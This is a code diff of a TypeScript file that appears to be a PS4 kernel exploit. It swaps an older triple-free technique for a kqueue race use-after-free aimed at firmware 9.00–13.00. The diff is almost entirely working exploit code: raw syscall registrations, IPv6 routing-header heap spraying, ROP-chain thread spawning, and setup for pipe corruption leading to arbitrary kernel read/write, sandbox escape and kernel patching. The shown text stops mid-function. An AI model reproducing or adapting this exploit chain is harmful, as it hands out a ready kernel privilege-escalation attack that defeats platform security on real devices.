@@ -1,2325 +1,681 @@
-import { fn, syscalls, BigInt, utils, gadgets } from 'download0/types'
-import { libc_addr } from 'download0/userland'
-import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
-import { show_success, run_binloader } from 'download0/loader'
+/**
+ *  kqueue_exploit.ts  –  PS4 9.00‑13.00 sys_kqueue race UAF
+ *
+ *  Replaces the old NetControl/ucred triple‑free with a double‑free
+ *  triggered by racing kqueue()/close().  The freed kqueue is reclaimed
+ *  via an IPv6 routing header spray, leaking kq_fdp.  Pipe corruption
+ *  then yields arbitrary kernel R/W, and jailbreak_shared() finishes
+ *  the sandbox escape and applies kernel patches.
+ *
+ *  All the heavy threading and ROP infrastructure is kept to a minimum;
+ *  the slow UIO/iov read/write paths are no longer needed.
+ */
 
-// include('userland.js')
+import { fn, syscalls, BigInt, utils, gadgets } from 'download0/types';
+import { libc_addr } from 'download0/userland';
+import {
+  get_fwversion, hex, malloc, read8, read16, read32, read64,
+  write8, write16, write32, write64,
+  get_kernel_offset, kernel, jailbreak_shared, send_notification,
+} from 'download0/kernel';
+import { show_success, run_binloader } from 'download0/loader';
 
-if (typeof libc_addr === 'undefined') {
-  include('userland.js')
-}
-include('kernel.js')
-include('binloader.js')
-if (!String.prototype.padStart) {
-  String.prototype.padStart = function padStart (targetLength, padString) {
-    targetLength = targetLength >> 0 // truncate if number or convert non-number to 0
-    padString = String(typeof padString !== 'undefined' ? padString : ' ')
-    if (this.length > targetLength) {
-      return String(this)
-    } else {
-      targetLength = targetLength - this.length
-      if (targetLength > padString.length) {
-        padString += padString.repeat(targetLength / padString.length) // append to original to ensure we are longer than needed
-      }
-      return padString.slice(0, targetLength) + String(this)
-    }
-  }
-}
+/* ============ missing syscall registrations ============ */
+fn.register(0x29, 'dup', ['bigint'], 'bigint');
+fn.register(0x06, 'close', ['bigint'], 'bigint');
+fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
+fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
+fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
+fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
+fn.register(0x16A, 'kqueue', [], 'bigint');
+fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
+fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
+fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
+fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
+fn.register(0x17, 'setuid', ['number'], 'bigint');
+fn.register(20, 'getpid', [], 'bigint');
+fn.register(0x14B, 'sched_yield', [], 'bigint');
+fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
+fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
+fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
+fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
+fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
+fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
+fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
 
-fn.register(0x29, 'dup', ['bigint'], 'bigint')
-const dup = fn.dup
-fn.register(0x06, 'close', ['bigint'], 'bigint')
-const close = fn.close
-fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint')
-const read = fn.read
-fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint')
-const write = fn.write
-fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint')
-const ioctl = fn.ioctl
-fn.register(0x2A, 'pipe', ['bigint'], 'bigint')
-const pipe = fn.pipe
-fn.register(0x16A, 'kqueue', [], 'bigint')
-const kqueue = fn.kqueue
-fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint')
-const socket = fn.socket
-fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint')
-const socketpair = fn.socketpair
-fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint')
-const getsockopt = fn.getsockopt
-fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint')
-const setsockopt = fn.setsockopt
-fn.register(0x17, 'setuid', ['number'], 'bigint')
-const setuid = fn.setuid
-fn.register(20, 'getpid', [], 'bigint')
-const getpid = fn.getpid
-fn.register(0x14B, 'sched_yield', [], 'bigint')
-const sched_yield = fn.sched_yield
-fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
-const cpuset_getaffinity = fn.cpuset_getaffinity
-fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
-const cpuset_setaffinity = fn.cpuset_setaffinity
-fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint')
-const rtprio_thread = fn.rtprio_thread
-fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint')
-const netcontrol = fn.netcontrol
-fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint')
-const thr_new = fn.thr_new
-fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint')
-const thr_kill = fn.thr_kill
-fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint')
-const nanosleep = fn.nanosleep
-fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint')
-const fcntl = fn.fcntl
+const dup                = fn.dup;
+const close              = fn.close;
+const read               = fn.read;
+const write              = fn.write;
+const ioctl              = fn.ioctl;
+const pipe               = fn.pipe;
+const kqueue             = fn.kqueue;
+const socket             = fn.socket;
+const socketpair         = fn.socketpair;
+const getsockopt         = fn.getsockopt;
+const setsockopt         = fn.setsockopt;
+const setuid             = fn.setuid;
+const getpid             = fn.getpid;
+const sched_yield        = fn.sched_yield;
+const cpuset_getaffinity = fn.cpuset_getaffinity;
+const cpuset_setaffinity = fn.cpuset_setaffinity;
+const rtprio_thread      = fn.rtprio_thread;
+const thr_new            = fn.thr_new;
+const thr_kill           = fn.thr_kill;
+const nanosleep          = fn.nanosleep;
+const fcntl              = fn.fcntl;
 
-// Extract syscall wrapper addresses for ROP chains from syscalls.map
-const read_wrapper = syscalls.map.get(0x03)!
-const write_wrapper = syscalls.map.get(0x04)!
-const sched_yield_wrapper = syscalls.map.get(0x14b)!
-const cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8)!
-const rtprio_thread_wrapper = syscalls.map.get(0x1D2)!
-const recvmsg_wrapper = syscalls.map.get(0x1B)!
-const readv_wrapper = syscalls.map.get(0x78)!
-const writev_wrapper = syscalls.map.get(0x79)!
-const thr_exit_wrapper = syscalls.map.get(0x1af)!
-const thr_suspend_ucontext_wrapper = syscalls.map.get(0x278)!
-const setsockopt_wrapper = syscalls.map.get(0x69)!
-const getsockopt_wrapper = syscalls.map.get(0x76)!
+/* ============ wrapper addresses from syscalls.map ============ */
+const read_wrapper            = syscalls.map.get(0x03)!;
+const write_wrapper           = syscalls.map.get(0x04)!;
+const recvmsg_wrapper         = syscalls.map.get(0x1B)!;
+const readv_wrapper           = syscalls.map.get(0x78)!;
+const writev_wrapper          = syscalls.map.get(0x79)!;
+const thr_exit_wrapper        = syscalls.map.get(0x1af)!;
+const cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8)!;
+const rtprio_thread_wrapper   = syscalls.map.get(0x1D2)!;
+const setsockopt_wrapper      = syscalls.map.get(0x69)!;
+const getsockopt_wrapper      = syscalls.map.get(0x76)!;
+const kqueue_wrapper          = syscalls.map.get(0x16A)!;
+const close_wrapper           = syscalls.map.get(0x06)!;
 
-fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint')
-const setjmp = fn.setjmp
-const setjmp_addr = libc_addr.add(0x6CA00)
-const longjmp_addr = libc_addr.add(0x6CA50)
+/* ============ libc helpers ============ */
+fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
+const setjmp        = fn.setjmp;
+const setjmp_addr   = libc_addr.add(0x6CA00);
+const longjmp_addr  = libc_addr.add(0x6CA50);
 
-const BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF)
+const BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
 
-const KERNEL_PID = 0
+/* ============ constants ============ */
+const PAGE_SIZE        = 0x4000;
+const AF_UNIX          = 1;
+const AF_INET6         = 28;
+const SOCK_STREAM      = 1;
+const IPPROTO_IPV6     = 41;
+const SO_SNDBUF        = 0x1001;
+const SOL_SOCKET       = 0xffff;
+const IPV6_RTHDR       = 51;
+const IPV6_RTHDR_TYPE_0= 0;
+const RTHDR_TAG        = 0x13370000;
+const UCRED_SIZE       = 0x168;
+const PIPEBUF_SIZE     = 0x18;
+const FILEDESCENT_SIZE = 0x8;
+const IPV6_SOCK_NUM    = 96;
+const MAIN_LOOP_ITER   = 3;
+const KQUEUE_SIZE      = 0x100;         // must match the target firmware
+const KQUEUE_RACE_THR  = 4;
+const MAIN_CORE        = 4;
+const MAIN_RTPRIO      = 0x100;
+const RTP_LOOKUP       = 0;
+const RTP_SET          = 1;
+const PRI_REALTIME     = 2;
+const F_SETFL          = 4;
+const O_NONBLOCK       = 4;
 
-const SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007)
+let FW_VERSION: string | null = null;
+let kernel_offs: any = null;            // returned by get_kernel_offset()
 
-const FIOSETOWN = 0x8004667C
+/* ============ global heap buffers ============ */
+const ipv6_socks: BigInt[] = new Array(IPV6_SOCK_NUM);
+const spray_rthdr   = malloc(UCRED_SIZE);
+let   spray_rthdr_len: number = -1;
+const leak_rthdr    = malloc(UCRED_SIZE);
+const spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
 
-const PAGE_SIZE = 0x4000
+const sockopt_len_ptr    = malloc(4);
+const nanosleep_timespec = malloc(0x10);
+const cpu_mask_buf       = malloc(0x10);
+const rtprio_scratch     = malloc(0x4);
+const spawn_thr_args     = malloc(0x80);
+const spawn_tid          = malloc(0x8);
+const spawn_cpid         = malloc(0x8);
 
-const NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
-const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007
+const master_pipe_buf = malloc(PIPEBUF_SIZE);
+const tmp             = malloc(PAGE_SIZE);
+const pipe_sock       = malloc(8);
 
-const AF_UNIX = 1
-const AF_INET6 = 28
-const SOCK_STREAM = 1
-const IPPROTO_IPV6 = 41
+let masterRpipeFd: number, masterWpipeFd: number;
+let victimRpipeFd: number, victimWpipeFd: number;
 
-const SO_SNDBUF = 0x1001
-const SOL_SOCKET = 0xffff
+let fdt_ofiles: BigInt;
+let kq_fdp: BigInt;
+let kl_lock: BigInt;                   // not strictly needed, but kept for base calculation
 
-const IPV6_RTHDR = 51
-const IPV6_RTHDR_TYPE_0 = 0
+let saved_fpu_ctrl = 0;
+let saved_mxcsr    = 0;
 
-const RTP_PRIO_REALTIME = 2
+/* kqueue race buffers */
+const kq_race_ready       = malloc(8 * KQUEUE_RACE_THR);
+const kq_race_signal_buf  = malloc(8 * KQUEUE_RACE_THR);
+const kq_race_run_pipes: number[] = []; // will store write ends
+const kq_race_thread_ids: number[]  = [];
 
-const UIO_READ = 0
-const UIO_WRITE = 1
-const UIO_SYSSPACE = 1
-
-const CPU_LEVEL_WHICH = 3
-const CPU_WHICH_TID = 1
-
-const IOV_SIZE = 0x10
-const CPU_SET_SIZE = 0x10
-const PIPEBUF_SIZE = 0x18
-const MSG_HDR_SIZE = 0x30
-const FILEDESCENT_SIZE = 0x8
-const UCRED_SIZE = 0x168
-
-const RTHDR_TAG = 0x13370000
-
-const UIO_IOV_NUM = 0x14
-const MSG_IOV_NUM = 0x17
-
-// Params for kext stability
-const IPV6_SOCK_NUM = 96
-const IOV_THREAD_NUM = 8
-const UIO_THREAD_NUM = 8
-const MAIN_LOOP_ITERATIONS = 3
-const TRIPLEFREE_ITERATIONS = 8
-const KQUEUE_ITERATIONS = 5000
-
-const MAX_ROUNDS_TWIN = 5
-const MAX_ROUNDS_TRIPLET = 200
-
-const MAIN_CORE = 4
-const MAIN_RTPRIO = 0x100
-
-const RTP_LOOKUP = 0
-const RTP_SET = 1
-const PRI_REALTIME = 2
-
-const F_SETFL = 4
-const O_NONBLOCK = 4
-
-let FW_VERSION: string | null = null // Needs to be initialized to patch kernel
-
-/***************************/
-/*      Used constiables     */
-/** *********************** */
-
-const twins = new Array(2)
-const triplets = new Array(3)
-const ipv6_socks = new Array(IPV6_SOCK_NUM)
-
-const spray_rthdr = malloc(UCRED_SIZE)
-let spray_rthdr_len: number = -1
-const leak_rthdr = malloc(UCRED_SIZE)
-
-// Allocate buffer for ipv6_sockets magic spray
-const spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE)
-// Allocate buffer array for all socket data (X sockets × 8 bytes each)
-const read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8)
-const check_len = malloc(4)
-// Initialize check_len to 8 bytes (done in JavaScript before ROP runs)
-
-let fdt_ofiles: BigInt = new BigInt(0)
-let master_r_pipe_file: BigInt = new BigInt(0)
-let victim_r_pipe_file: BigInt = new BigInt(0)
-let master_r_pipe_data: BigInt = new BigInt(0)
-let victim_r_pipe_data: BigInt = new BigInt(0)
-
-// Corrupt pipebuf of masterRpipeFd.
-const master_pipe_buf = malloc(PIPEBUF_SIZE)
-
-write32(check_len, 8)
-
-const msg = malloc(MSG_HDR_SIZE)
-const msgIov = malloc(MSG_IOV_NUM * IOV_SIZE)
-const uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE)
-const uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE)
-
-const uio_sock = malloc(8)
-const iov_sock = malloc(8)
-
-const iov_thread_ready = malloc(8 * IOV_THREAD_NUM)
-const iov_thread_done = malloc(8 * IOV_THREAD_NUM)
-const iov_signal_buf = malloc(8 * IOV_THREAD_NUM)
-
-const uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM)
-const uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM)
-const uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM)
-
-const uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM)
-const uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM)
-const uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM)
-
-const spray_ipv6_ready = malloc(8)
-const spray_ipv6_done = malloc(8)
-const spray_ipv6_signal_buf = malloc(8)
-const spray_ipv6_stack = malloc(0x2000)
-
+/* IPv6 spray worker (the only worker we still need) */
 interface Worker {
-  rop: BigInt[]
-  loop_size: number
-  pipe_0: number
-  pipe_1: number
-  ready: BigInt
-  done: BigInt
-  signal_buf: BigInt
-  thread_id?: number
+  rop: BigInt[];
+  loop_size: number;
+  pipe_0: number;
+  pipe_1: number;
+  ready: BigInt;
+  done: BigInt;
+  signal_buf: BigInt;
+  thread_id?: number;
+}
+let spray_ipv6_worker: Worker;
+const spray_ipv6_stack = malloc(0x2000);
+
+/* ============ helper functions ============ */
+function build_rthdr(buf: BigInt, size: number): number {
+  const len = ((size >> 3) - 1) & ~1;
+  const actual_size = (len + 1) << 3;
+  write8(buf.add(0x00), 0);
+  write8(buf.add(0x01), len);
+  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);
+  write8(buf.add(0x03), (len >> 1));
+  return actual_size;
 }
 
-const iov_recvmsg_workers: Worker[] = []
-const uio_readv_workers: Worker[] = []
-const uio_writev_workers: Worker[] = []
-let spray_ipv6_worker: Worker
+function set_sockopt(sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number): void {
+  if (setsockopt(sd, level, optname, optval, optlen).eq(BigInt_Error))
+    throw new Error('setsockopt failed');
+}
+function get_sockopt(sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number): number {
+  write32(sockopt_len_ptr, optlen);
+  if (getsockopt(sd, level, optname, optval, sockopt_len_ptr).eq(BigInt_Error))
+    throw new Error('getsockopt failed');
+  return read32(sockopt_len_ptr);
+}
+function set_rthdr(sd: BigInt, buf: BigInt, len: number): void { set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len); }
+function get_rthdr(sd: BigInt, buf: BigInt, max_len: number): number { return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len); }
+function free_rthdr(sd: BigInt): void { set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0); }
+function free_rthdrs(sds: BigInt[]): void { for (const sd of sds) free_rthdr(sd); }
 
-let uaf_socket: number | undefined
-
-let uio_sock_0: number
-let uio_sock_1: number
-
-let iov_sock_0: number
-let iov_sock_1: number
-const pipe_sock = malloc(8)
-const master_pipe: [number, number] = [0, 0]
-const victim_pipe: [number, number] = [0, 0]
-
-let masterRpipeFd: number
-let masterWpipeFd: number
-let victimRpipeFd: number
-let victimWpipeFd: number
-
-let kq_fdp: BigInt
-let kl_lock: BigInt
-
-const tmp = malloc(PAGE_SIZE)
-
-let saved_fpu_ctrl = 0
-let saved_mxcsr = 0
-
-function build_rthdr (buf: BigInt, size: number) {
-  const len = ((size >> 3) - 1) & ~1
-  const actual_size = (len + 1) << 3
-  write8(buf.add(0x00), 0)                   // ip6r_nxt
-  write8(buf.add(0x01), len)                 // ip6r_len
-  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0)   // ip6r_type
-  write8(buf.add(0x03), (len >> 1))          // ip6r_segleft
-  return actual_size
+function pin_to_core(core: number): void {
+  write32(cpu_mask_buf, 1 << core);
+  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
+}
+function get_current_core(): number {
+  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
+  let num = Number(read32(cpu_mask_buf));
+  let pos = 0;
+  while (num > 0) { num >>>= 1; pos++; }
+  return pos - 1;
+}
+function set_rtprio(prio: number): void {
+  write16(rtprio_scratch, PRI_REALTIME);
+  write16(rtprio_scratch.add(2), prio);
+  rtprio_thread(RTP_SET, 0, rtprio_scratch);
+}
+function get_rtprio(): number {
+  write16(rtprio_scratch, PRI_REALTIME);
+  write16(rtprio_scratch.add(2), 0);
+  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
+  return Number(read16(rtprio_scratch.add(2)));
 }
 
-function set_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
-  const result = setsockopt(sd, level, optname, optval, optlen)
-  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-    throw new Error('set_sockopt error: ' + hex(result))
-  }
-  return result
+function nanosleep_fun(nsec: number): void {
+  write64(nanosleep_timespec, Math.floor(nsec / 1e9));
+  write64(nanosleep_timespec.add(8), nsec % 1e9);
+  nanosleep(nanosleep_timespec);
+}
+function wait_for(addr: BigInt, threshold: number): void {
+  while (!read64(addr).eq(threshold)) nanosleep_fun(1);
+}
+function fill_buffer_64(buf: BigInt, val: BigInt, len: number): void {
+  for (let i = 0; i < len; i += 8) write64(buf.add(i), val);
 }
 
-// Global buffer to minimize footprint
-const sockopt_len_ptr = malloc(4)
+/* ============ ROP thread spawner ============ */
+function spawn_thread(ropArray: BigInt[], loopSize: number, predefinedStack?: BigInt): BigInt {
+  const ropAddr = predefinedStack ?? malloc(0x600);
+  for (let i = 0; i < ropArray.length; i++) write64(ropAddr.add(i * 8), ropArray[i]!);
 
-const nanosleep_timespec = malloc(0x10)
-const cpu_mask_buf = malloc(0x10)
-const rtprio_scratch = malloc(0x4)
-const sockopt_val_buf = malloc(4)
-const nc_set_buf = malloc(8)
-const nc_clear_buf = malloc(8)
-const spawn_thr_args = malloc(0x80)
-const spawn_tid = malloc(0x8)
-const spawn_cpid = malloc(0x8)
-
-function get_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
-  // const len_ptr = malloc(4);
-  write32(sockopt_len_ptr, optlen)
-  const result = getsockopt(sd, level, optname, optval, sockopt_len_ptr)
-  // debug("get_sockopt with sd: " + hex(sd) + " result: " + hex(result));
-  if (result.eq(BigInt_Error)) {
-    throw new Error('get_sockopt error: ' + hex(result))
-    // debug("get_sockopt error: " + hex(result));
+  // If loopSize > 0 and last gadget is JMP_REL, fix the relative offset
+  if (loopSize > 0 && ropArray[ropArray.length - 1]!.eq(gadgets.JMP_REL)) {
+    const loopStartIdx = ropArray.length - 1 - loopSize;
+    const jmpOffset = loopStartIdx - (ropArray.length - 1);   // negative
+    write32(ropAddr.add((ropArray.length - 1) * 8 + 4), jmpOffset);
   }
-  return read32(sockopt_len_ptr)
+
+  const jmpbuf = malloc(0x60);
+  write64(jmpbuf.add(0x00), gadgets.RET);
+  write64(jmpbuf.add(0x10), ropAddr);
+  write32(jmpbuf.add(0x40), saved_fpu_ctrl);
+  write32(jmpbuf.add(0x44), saved_mxcsr);
+
+  const stack = malloc(0x100);
+  const tls = malloc(0x40);
+  write64(spawn_thr_args.add(0x00), longjmp_addr);
+  write64(spawn_thr_args.add(0x08), jmpbuf);
+  write64(spawn_thr_args.add(0x10), stack);           write64(spawn_thr_args.add(0x18), new BigInt(0x100));
+  write64(spawn_thr_args.add(0x20), tls);              write64(spawn_thr_args.add(0x28), new BigInt(0x40));
+  write64(spawn_thr_args.add(0x30), spawn_tid);        write64(spawn_thr_args.add(0x38), spawn_cpid);
+
+  const result = thr_new(spawn_thr_args, 0x68);
+  if (!result.eq(0)) throw new Error('thr_new failed');
+  return read64(spawn_tid);
 }
 
-function set_rthdr (sd: BigInt, buf: BigInt, len: number) {
-  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
-  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
-  // return ret;
+function init_threading(): void {
+  const jb = malloc(0x60);
+  setjmp(jb);
+  saved_fpu_ctrl = Number(read32(jb.add(0x40)));
+  saved_mxcsr    = Number(read32(jb.add(0x44)));
 }
 
-function get_rthdr (sd: BigInt, buf: BigInt, max_len: number) {
-  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len)
-  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
-  // return ret;
-}
+/* ============ IPv6 spray worker ============ */
+function ipv6_sock_spray_and_read_rop(ready: BigInt, runFd: BigInt, done: BigInt, signalBuf: BigInt): { rop: BigInt[]; loop_size: number } {
+  const rop: BigInt[] = [new BigInt(0)];
 
-function free_rthdrs (sds: BigInt[]) {
-  for (const sd of sds) {
-    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
-    }
-  }
-}
+  // pin & priority
+  const mask = malloc(0x10); write16(mask, 1 << MAIN_CORE);
+  rop.push(gadgets.POP_RDI_RET, new BigInt(3));
+  rop.push(gadgets.POP_RSI_RET, new BigInt(1));
+  rop.push(gadgets.POP_RDX_RET, BigInt_Error);
+  rop.push(gadgets.POP_RCX_RET, new BigInt(0x10));
+  rop.push(gadgets.POP_R8_RET, mask);
+  rop.push(cpuset_setaffinity_wrapper);
 
-function free_rthdr (sd: BigInt) {
-  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
-}
+  const rtbuf = malloc(4); write16(rtbuf, PRI_REALTIME); write16(rtbuf.add(2), MAIN_RTPRIO);
+  rop.push(gadgets.POP_RDI_RET, new BigInt(1));
+  rop.push(gadgets.POP_RSI_RET, new BigInt(0));
+  rop.push(gadgets.POP_RDX_RET, rtbuf);
+  rop.push(rtprio_thread_wrapper);
 
-function pin_to_core (core: number) {
-  write32(cpu_mask_buf, 1 << core)
-  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
-}
+  // signal ready
+  rop.push(gadgets.POP_RDI_RET, ready);
+  rop.push(gadgets.POP_RAX_RET, new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
 
-function get_core_index (mask_addr: BigInt) {
-  let num = Number(read32(mask_addr))
-  let position = 0
-  while (num > 0) {
-    num = num >>> 1
-    position++
-  }
-  return position - 1
-}
+  // wait for start signal
+  rop.push(gadgets.POP_RDI_RET, runFd);
+  rop.push(gadgets.POP_RSI_RET, signalBuf);
+  rop.push(gadgets.POP_RDX_RET, new BigInt(1));
+  rop.push(read_wrapper);
 
-function get_current_core () {
-  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
-  return get_core_index(cpu_mask_buf)
-}
-
-function set_rtprio (prio: number) {
-  write16(rtprio_scratch, PRI_REALTIME)
-  write16(rtprio_scratch.add(2), prio)
-  rtprio_thread(RTP_SET, 0, rtprio_scratch)
-}
-
-function get_rtprio () {
-  write16(rtprio_scratch, PRI_REALTIME)
-  write16(rtprio_scratch.add(2), 0)
-  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch)
-  return Number(read16(rtprio_scratch.add(2)))
-}
-
-function create_workers () {
-  const sock_buf = malloc(8)
-
-  // Create workers
-  for (let i = 0; i < IOV_THREAD_NUM; i++) {
-    const ready = iov_thread_ready.add(8 * i)
-    const done = iov_thread_done.add(8 * i)
-    const signal_buf = iov_signal_buf.add(8 * i)
-
-    // Socket pair to signal "run"
-    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
-    const pipe_0 = read32(sock_buf)
-    const pipe_1 = read32(sock_buf.add(4))
-    // debug("create pipe: " + pipe_0 + " " + pipe_1);
-
-    const ret = iov_recvmsg_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)
-
-    const worker: Worker = {
-      rop: ret.rop,
-      loop_size: ret.loop_size,
-      pipe_0,
-      pipe_1,
-      ready,
-      done,
-      signal_buf
-    }
-    iov_recvmsg_workers[i] = worker
-  }
-
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    const ready = uio_readv_thread_ready.add(8 * i)
-    const done = uio_readv_thread_done.add(8 * i)
-    const signal_buf = uio_readv_signal_buf.add(8 * i)
-
-    // Socket pair to signal "run"
-    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
-    const pipe_0 = read32(sock_buf)
-    const pipe_1 = read32(sock_buf.add(4))
-    // debug("create pipe: " + pipe_0 + " " + pipe_1);
-
-    const ret = uio_readv_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)
-
-    const worker = {
-      rop: ret.rop,
-      loop_size: ret.loop_size,
-      pipe_0,
-      pipe_1,
-      ready,
-      done,
-      signal_buf
-    }
-    uio_readv_workers[i] = worker
-  }
-
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    const ready = uio_writev_thread_ready.add(8 * i)
-    const done = uio_writev_thread_done.add(8 * i)
-    const signal_buf = uio_writev_signal_buf.add(8 * i)
-
-    // Socket pair to signal "run"
-    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
-    const pipe_0 = read32(sock_buf)
-    const pipe_1 = read32(sock_buf.add(4))
-    // debug("create pipe: " + pipe_0 + " " + pipe_1);
-
-    const ret = uio_writev_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)
-
-    const worker = {
-      rop: ret.rop,
-      loop_size: ret.loop_size,
-      pipe_0,
-      pipe_1,
-      ready,
-      done,
-      signal_buf
-    }
-    uio_writev_workers[i] = worker
-  }
-
-  // Create worker for spray and read magic in ipv6_sockets
-  const ready = spray_ipv6_ready
-  const done = spray_ipv6_done
-  const signal_buf = spray_ipv6_signal_buf
-
-  // Socket pair to signal "run"
-  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
-  const pipe_0 = read32(sock_buf)
-  const pipe_1 = read32(sock_buf.add(4))
-
-  const ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(pipe_0), done, signal_buf)
-
-  const worker = {
-    rop: ret.rop,
-    loop_size: ret.loop_size,
-    pipe_0,
-    pipe_1,
-    ready,
-    done,
-    signal_buf
-  }
-
-  spray_ipv6_worker = worker         // --> Worker data
-}
-
-function init_workers () {
-  init_threading() // save needed info for longjmp
-
-  let worker
-  let ret
-
-  for (let i = 0; i < IOV_THREAD_NUM; i++) {
-    worker = iov_recvmsg_workers[i]!
-    ret = spawn_thread(worker.rop, worker.loop_size)
-    if (ret.eq(BigInt_Error)) {
-      throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']')
-    }
-    const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
-    worker.thread_id = thread_id   // Save thread ID
-  }
-
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_readv_workers[i]!
-    ret = spawn_thread(worker.rop, worker.loop_size)
-    if (ret.eq(BigInt_Error)) {
-      throw new Error('Could not spawn uio_readv_workers[' + i + ']')
-    }
-    const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
-    worker.thread_id = thread_id     // Save thread ID
-  }
-
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    worker = uio_writev_workers[i]!
-    ret = spawn_thread(worker.rop, worker.loop_size)
-    if (ret.eq(BigInt_Error)) {
-      throw new Error('Could not spawn uio_writev_workers[' + i + ']')
-    }
-    const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
